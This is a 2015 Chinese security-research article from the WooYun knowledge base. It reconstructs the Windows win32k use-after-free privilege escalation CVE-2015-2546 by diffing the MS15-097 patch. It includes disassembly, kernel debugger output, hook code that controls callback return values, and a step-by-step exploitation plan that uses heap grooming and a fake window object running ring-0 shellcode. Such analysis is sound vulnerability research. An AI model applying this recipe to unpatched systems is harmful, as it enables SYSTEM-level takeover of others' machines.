<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">CVE-2015-2546：从补丁比对到Exploit</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">百度安全攻防实验室</a> <span class="bull">·</span> <time title="2015/09/26 19:18" ui-time="" datetime="2015/09/26 19:18" class="published ng-binding ng-isolate-scope">2015/09/26 19:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>本月微软安全公告MS15-097修复了Microsoft Graphics组件中多个内核漏洞。其中Win32k内存损坏特权提升漏洞：CVE-2015-2546（<a href="https://technet.microsoft.com/zh-CN/library/security/ms15-097.aspx">https://technet.microsoft.com/zh-CN/library/security/ms15-097.aspx</a>）引起了笔者的注意。该漏洞是FireEye在9月8日发布的一份攻击报告（<a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/twoforonefinal.pdf">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/twoforonefinal.pdf</a>）中发现的，攻击者利用该漏洞可获得系统SYSTEM权限。</p><p>查看微软公告对该漏洞的描述：“如果 Windows 内核模式驱动程序不正确地处理内存中的对象，则 Windows 中存在多个特权提升漏洞。成功利用这些漏洞的攻击者可以在内核模式下运行任意代码。”没有太多有效信息，笔者遂尝试通过补丁比对来还原这个漏洞的细节。</p><p>CVE-2015-2546影响从win7 ~win10的众多windows版本。鉴于win7上win32k的符号比较齐全，笔者选择安装win7 sp1 32位系统的补丁进行比对。</p><p>PatchDiff2得到的结果：</p><p><img alt="" img-src="c24a7532af163eab535141f45282300d91e32609.jpg"></p><p>分析到xxxMNMouseMove函数所做的更改：</p><p><img alt="" img-src="0065b7b409f41a5d189ec1dc847c4fc37c35532a.jpg"></p><p>补丁代码很直观，在xxxSendMessage调用完成之后多了一处检查。</p><p>研究过win32k内部机制可知：对于MenuWindow，tagWND+0xB0处存放的是其pPopupMenu的指针。因此这几句是检查回调之后tagMENUWND-> pPopupMenu是否被修改。</p><p>FireEye的报告中明确提到：CVE-2015-2546是一个tagPOPUPMENU对象的UAF。至此，笔者确定该漏洞的缺陷函数就是xxxMNMouseMove。</p><p>进一步分析xxxMNHideNextHierarchy函数之后，笔者得出整个漏洞的触发流程：在xxxMNMouseMove函数中，xxxSendMessage(pwnd, 0x1F0,…)发起了一次用户模式回调。在这次回调中，攻击者可以销毁Menu窗口从而释放tagPOPUPMENU对象并占位重用。当回调返回内核之后，补丁前的xxxMNmouseMove并没有对已释放的pPopupMenu进行验证。之后pPopupMenu被传入xxxMNHideNextHierarchy，xxxMNHideNextHierarchy会对tagPOPUPMENU.spwndNextPopup发送消息：</p><pre><code>.text:BF91C0AA __stdcall xxxMNHideNextHierarchy(x) proc near
.text:BF91C0AA ; CODE XREF: xxxMNButtonDown(x,x,x,x)+62p
.text:BF91C0AA ; xxxMNMouseMove(x,x,x)+18Ep
.text:BF91C0AA
.text:BF91C0AA ptl = dword ptr -0Ch
.text:BF91C0AA var_8 = dword ptr -8
.text:BF91C0AA pPopupMenu = dword ptr 8
.text:BF91C0AA
.text:BF91C0AA mov edi, edi
.text:BF91C0AC push ebp
.text:BF91C0AD mov ebp, esp
.text:BF91C0AF mov ecx, [ebp+pPopupMenu]
.text:BF91C0B2 sub esp, 0Ch
.text:BF91C0B5 push esi
.text:BF91C0B6 mov esi, [ecx+tagPOPUPMENU.spwndNextPopup]
.text:BF91C0B9 test esi, esi
.text:BF91C0BB jz short loc_BF91C104
.text:BF91C0BD mov eax, _gptiCurrent
.text:BF91C0C2 add eax, 0B4h ; pTL
.text:BF91C0C7 mov edx, [eax]
.text:BF91C0C9 mov [ebp+ptl], edx
.text:BF91C0CC lea edx, [ebp+ptl]
.text:BF91C0CF mov [eax], edx
.text:BF91C0D1 mov [ebp+var_8], esi
.text:BF91C0D4 inc [esi+tagWND.head.cLockObj]
.text:BF91C0D7 cmp esi, [ecx+tagPOPUPMENU.spwndActivePopup]
.text:BF91C0DA jz short loc_BF91C0EB
.text:BF91C0DC push 0 ; NumberOfBytes
.text:BF91C0DE push 0 ; MbString
.text:BF91C0E0 push 1E4h ; int
.text:BF91C0E5 push esi ; tagPOPUPMENU.spwndNextPopup
.text:BF91C0E6 call xxxSendMessage(x,x,x,x)
</code></pre><p>攻击者创建合适的对象占用被释放的tagPOPUPMENU内存，构造好tagPOPUPMENU.spwndNextPopup的数据，即可达成内核任意代码执行。</p><p>随后，笔者尝试构造POC来实现上述过程。</p><p>xxxMNMouseMove函数的工作原理：在PopupMenu的消息循环中，内核在消息队列中取到了WM&#95;NCMOUSEMOVE消息；或者xxxMenuWindowProc收到了MN&#95;MOUSEMOVE消息，win32k都会调用xxxMNMouseMove函数来进行处理。</p><p>因此</p><pre><code>xxxTrackPopupMenuEx-&gt;xxxMNLoop-&gt;xxxHandleMenuMessage-&gt;xxxMNMouseMove
xxxMenuWindowProc-&gt;xxxRealMenuWindowProc-&gt;xxxMNMouseMove
xxxSysComman-&gt;xxxMNLoop-&gt;xxxHandleMenuMessage-&gt;xxxMNMouseMove
//…
</code></pre><p>等都是有可能的</p><p>该选择哪条路径呢？ba e1 win32k!xxxMNMouseMove探索一番</p><p>在桌面弹出右键菜单的时候：</p><pre><code>0: kd&gt; kb
ChildEBP RetAddr Args to Child
8d10ea8c 9036bbdb fe6c08e8 904557e0 0092002f win32k!xxxMNMouseMove
8d10eae8 9036b7b1 8d10eb08 904557e0 fe6c08e8 win32k!xxxHandleMenuMessages+0x2f2
8d10eb34 90371717 fe6c08e8 904557e0 00000000 win32k!xxxMNLoop+0x2fa
8d10eba0 90371802 fea19660 00000102 0000002f win32k!xxxTrackPopupMenuEx+0x5fd
8d10ec14 8288d1ea 001a01d3 00000102 0000002f win32k!NtUserTrackPopupMenuEx+0xc3
8d10ec14 76e370b4 001a01d3 00000102 0000002f nt!KiFastCallEntry+0x12a
0024e3ac 760e483e 760d2243 001a01d3 00000102 ntdll!KiFastSystemCallRet
0024e3b0 760d2243 001a01d3 00000102 0000002f USER32!NtUserTrackPopupMenuEx+0xc
0024e3d0 756272c9 001a01d3 00000102 0000002f USER32!TrackPopupMenu+0x1b
</code></pre><p>点击win32k窗口程序菜单：</p><pre><code>0: kd&gt; kb
ChildEBP RetAddr Args to Child
92e2fa50 90dabbdb 90e95860 90e957e0 00e900de win32k!xxxMNMouseMove
92e2faac 90dab7b1 92e2facc 90e957e0 90e95860 win32k!xxxHandleMenuMessages+0x2f2
92e2faf8 90dbdd69 90e95860 90e957e0 00e900de win32k!xxxMNLoop+0x2fa
92e2fb28 90d1fcc5 fea0f2b0 0000f095 00e900de win32k!xxxSysCommand+0x4a5
92e2fba4 90d2d417 fea0f2b0 00000112 0000f095 win32k!xxxRealDefWindowProc+0xc00
92e2fbbc 90cf8117 fea0f2b0 00000112 0000f095 win32k!xxxWrapRealDefWindowProc+0x2b
92e2fbd8 90d2d2d3 fea0f2b0 00000112 0000f095 win32k!NtUserfnDWORD+0x27
92e2fc10 828551ea 00030152 00000112 0000f095 win32k!NtUserMessageCall+0xcf
</code></pre><p>看来执行到xxxMNMouseMove并不困难，但是笔者发现要执行到xxxSendMessage(pWnd, 0x1F0)就不容易了:</p><p><img alt="" img-src="efb82a019e1d33a789daf595a55606379ca041de.jpg"></p><p>仔细分析xxxMNMouseMove函数代码</p><pre><code>.text:BF93CDC6 loc_BF93CDC6: ; CODE XREF: xxxMNMouseMove(x,x,x)+12Dj
.text:BF93CDC6 ; xxxMNMouseMove(x,x,x)+135j …
.text:BF93CDC6 xor edi, edi
.text:BF93CDC8 push edi ; NumberOfBytes
.text:BF93CDC9 push [ebp+pPopupMenu] ; MbString
.text:BF93CDCC push 1E5h ; int
.text:BF93CDD1 push esi ; Address
.text:BF93CDD2 call xxxSendMessage(x,x,x,x)
.text:BF93CDD7 test al, 10h
.text:BF93CDD9 jz short loc_BF93CE32
.text:BF93CDDB test al, 3
.text:BF93CDDD jnz short loc_BF93CE32
.text:BF93CDDF push edi ; NumberOfBytes
.text:BF93CDE0 push edi ; MbString
.text:BF93CDE1 push MN_SETTIMERTOOPENHIERARCHY ; int
.text:BF93CDE6 push esi ; spwndPopupMenu
.text:BF93CDE7 call xxxSendMessage(x,x,x,x) ; CallBack
.text:BF93CDEC test eax, eax
.text:BF93CDEE jnz short loc_BF93CE32
.text:BF93CDF0 push ebx ; fake_tagPopupMenu
.text:BF93CDF1 call xxxMNHideNextHierarchy(x) ; Trigger
</code></pre><p>esi必须是一个窗口对象，而ebx必须是我们可以占位重用的PopupMenu</p><p>先看ebx的值从哪儿来：</p><pre><code>.text:BF93CD67 mov eax, _gptiCurrent
.text:BF93CD6C add eax, 0B4h
.text:BF93CD71 mov ecx, [eax]
.text:BF93CD73 mov [ebp+var_C], ecx
.text:BF93CD76 lea ecx, [ebp+var_C]
.text:BF93CD79 mov [eax], ecx
.text:BF93CD7B mov [ebp+var_8], esi
.text:BF93CD7E inc dword ptr [esi+4]
.text:BF93CD81 mov edi, [edi+4]
.text:BF93CD84 mov ebx, [ebx+0B0h] //sizeof(tagWND) = 0xac
.text:BF93CD8A test edi, 100h
.text:BF93CD90 jz short loc_BF93CDC6
</code></pre><p>0xB0刚好等于<strong>sizeof(tagWND) + 0x4</strong>，而ebx又是一个tagPOPUPMENU对象，那么在BF93CD84这句之前，ebx必须是一个MenuWnd!</p><p>再向前查看代码：</p><pre><code>.text:BF93CD49 push esi
.text:BF93CD4A call safe_cast_fnid_to_PMENUWND(x)
.text:BF93CD4F push esi
.text:BF93CD50 mov ebx, eax
.text:BF93CD52 call IsWindowBeingDestroyed(x)
.text:BF93CD57 test eax, eax
.text:BF93CD59 jnz loc_BF93CE41
.text:BF93CD5F test ebx, ebx ; tagMENUWND
.text:BF93CD61 jz loc_BF93CE41
</code></pre><p>IsWindowBeingDestroyed只是检查esi指向的pWnd状态，ebx的值来自于safe&#95;cast&#95;fnid&#95;to&#95;PMENUWND。</p><p>查看safe&#95;cast&#95;fnid&#95;to&#95;PMENUWND函数，只是检查pWnd->fnid，合适就将传入的pWnd指针原封返回。</p><p>继续追踪esi的来源，终于发现esi指向的窗口对象来自这里：</p><pre><code>.text:BF93CCA1 push esi
.text:BF93CCA2 mov [edi+0Ch], eax
.text:BF93CCA5 push ecx ; screenPt
.text:BF93CCA6 lea eax, [ebp+pPopupMenu]
.text:BF93CCA9 push eax ; pIndex
.text:BF93CCAA push ebx ; pPopupMenu
.text:BF93CCAB call xxxMNFindWindowFromPoint(x,x,x) //得到MenuWnd指针
.text:BF93CCB0 mov esi, eax
.text:BF93CCB2 push esi
.text:BF93CCB3 call IsMFMWFPWindow(x)
</code></pre><p>然而笔者多次调试，发现这一步得到的返回值总是NULL：</p><p><img alt="" img-src="dc15d598392f6b1e81da01df2ff7e4d2408db9b8.jpg"></p><pre><code>1: kd&gt; p
win32k!xxxMNMouseMove+0x4d:
90dabfc7 8bf0 mov esi,eax
1: kd&gt; r eax
eax=00000000
</code></pre><p>冷静分析xxxMNFindWindowFromPoint函数，该函数实际上是根据当前鼠标的位置返回其指向的菜单窗口。然而，如果传入的pPopupMenu->fIsMenuBar为1，该函数返回的只能是0或0xFFFFFFFB，0xFFFFFFFF几个固定值。</p><p>查看一下我们传入的pPopupMenu:</p><pre><code>1: kd&gt; dt tagPOPUPMENU 90e95860
win32k!tagPOPUPMENU
+0x000 fIsMenuBar : 0y1
+0x000 fHasMenuBar : 0y1
+0x000 fIsSysMenu : 0y0
//…
+0x000 flockDelayedFree : 0y0
+0x004 spwndNotify : 0xfea0f2b0 tagWND
+0x008 spwndPopupMenu : 0xfea0f2b0 tagWND
</code></pre><p>这里的tagPOPUPMENU对象一直是内核自动创建的，fIsMenuBar这个字段初始化时就被置为1。</p><p>不过笔者发现如果pPopupMenu->spwndNextPopup不为NULL，xxxMNFindWindowFromPoint会向这个窗口发送MN_FINDMENUWINDOWFROMPOINT消息：</p><pre><code>.text:BF93CE9E push eax ; NumberOfBytes
.text:BF93CE9F lea eax, [ebp+pPopupMenu]
.text:BF93CEA2 push eax ; MbString
.text:BF93CEA3 push MN_FINDMENUWINDOWFROMPOINT ; int
.text:BF93CEA8 push dword ptr [edi+0Ch] ; Address
.text:BF93CEAB call xxxSendMessage(x,x,x,x)
</code></pre><p>于是笔者想到可以通过消息钩子来控制这一步的返回值！</p><p>笔者编译了一个包含两级菜单的文档视图窗口程序，并且在消息钩子函数中替换了菜单窗口的默认WndProc：</p><pre><code>LRESULT CALLBACK MyWndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
if (Msg == 0x1EB)
{
// __asm int 3;
return (LONG)g_hMenuWnd;
}
return DefWindowProc(hWnd, Msg, wParam, lParam);
}
</code></pre><p>这样xxxMNFindWindowFromPoint返回的就是我们事先创建的MenuWindow对象了。</p><pre><code>1: kd&gt; g
Breakpoint 1 hit
win32k!xxxMNMouseMove+0x48:
90dabfc2 e8a8010000 call win32k!xxxMNFindWindowFromPoint (90dac16f)
1: kd&gt; r eax
eax=fe40f788 //pWnd    

1: kd&gt; dd fe40f788 + b0 l1
fe40f838 fe3e3588 //tagPOPUPMENU    

1: kd&gt; dt fe3e3588 tagPOPUPMENU
win32k!tagPOPUPMENU
+0x000 fIsMenuBar : 0y0
+0x000 fHasMenuBar : 0y0
+0x000 fIsSysMenu : 0y0
//…
+0x004 spwndNotify : (null)
+0x008 spwndPopupMenu : 0xfe40f788 指向PopupMenu所属的tagWND对象
+0x00c spwndNextPopup : (null)
+0x010 spwndPrevPopup : (null)
</code></pre><p>后面执行到</p><p><img alt="" img-src="ebee13ecad471d9d7f3890cb344610295c894245.jpg"></p><p>这里xxxSendMessage(pWnd, 0x1E5, …)的返回值还得控制一下，否则一直返回0。</p><p>在MenuWindow的窗口函数中处理0x1E5消息：</p><pre><code>if (Msg == 0x1E5) //MN_SELECTITEM
{
//控制返回值
return 0x10;
}
</code></pre><p>终于能执行到xxxMNHideNextHierarchy了：</p><p><img alt="" img-src="7467b1df2e81f60bd1f353de09651cca6b9a7e57.jpg"></p><p>最后，笔者还原出CVE-2015-2546的利用过程如下：</p><ol><li>创建一个有弹出式菜单的正常主窗口</li><li>在某个固定地址Addr1分配内存，并在Addr1上构造一个fake&#95;tag WND。其中fake&#95;tagWND->bServerSideWindowProc置为1，fake_tagWND->lpfnWndProc指向Ring0ShellCode。</li><li>用Accelerator Table对象制作出内存空洞。</li><li>创建类名为”#32768”的窗口MenuWindow1，并用SetWindowLong替换其WndProc。</li><li>创建消息钩子，并在HookProc中处理MN&#95;FINDWINDOWFROMPOINT消息和MN&#95;SETTIMERTOOPENHIERARCHY消息。</li><li>向主窗口发送WM_SYSCOMMAND消息或者模拟鼠标事件。</li><li>系统创建的正常菜单窗口收到MN_FINDWINDOWFROMPOINT消息，返回MenuWindow1的句柄。</li><li>HookProc收到MN_SETTIMERTOOPENHIERARCHY消息，销毁MenuWindow1，并创建Accelerator Table对象占用tagPOPUPMENU释放的内存。</li><li>Fake_tagWND收到0x1E4消息，执行Ring0ShellCode。</li></ol><p>触发提权ShellCode：</p><p><img alt="" img-src="4132e10b98d78a9c69857a19bd10352935456dd2.jpg"></p><p>利用成功截图</p><p><img alt="" img-src="f061f16488951d939e280e2f4aef8141f008e40c.jpg"></p><p>PS:其实这个漏洞并不一定非得用Accelerator Table占位，有更好的对象适合用来控制占位数据。攻击者使用Accelerator Table反而导致需要分配零页内存：最终执行到xxxSendMessageTimeOut时，fakePopupMenu->spwndNextPopup正是占位的tagACCELTABLE.cAccel的值。如果选择其他对象进行占位，完全可以在更高平台利用这个漏洞。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/7049" rel="bookmark" id="re1">Hacking Team攻击代码分析Part 4: Flash 0day漏洞 CVE-2015-5122</a></li><li><a href="http://drops.wooyun.org/papers/8988" rel="bookmark" id="re2">WordPress Vulnerability Analysis (CVE-2015-5714 &amp; CVE-2015-5715)</a></li><li><a href="http://drops.wooyun.org/papers/7649" rel="bookmark" id="re3">逆向基础 Finding important/interesting stuff in the code (二)</a></li><li><a href="http://drops.wooyun.org/papers/10235" rel="bookmark" id="re4">OpenSSLX509Certificate反序列化漏洞（CVE-2015-3825）成因分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Mark</span> <span class="reply-time">2015-09-27 23:42:57</span></div><p></p><p>一个星期没刷知识库，发现更新了好多</p><p></p></div></div></div></div></div></main>